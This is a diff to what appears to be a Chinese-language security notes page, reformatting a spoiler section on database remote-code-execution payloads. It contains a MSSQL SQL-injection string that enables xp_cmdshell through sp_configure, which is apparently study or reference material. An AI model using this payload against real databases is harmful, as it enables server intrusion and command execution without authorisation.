@@ -244,8 +244,12 @@ date: 2024-02-07
 
   </details>
 
-- <details markdown="1"><summary><span class="spoiler">各資料庫 RCE Payload Example</span></summary>
-    - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
+- 各資料庫 RCE Payload
+
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
+  - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
+
       ```sql
       -- 啟用 xp_cmdshell
       $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
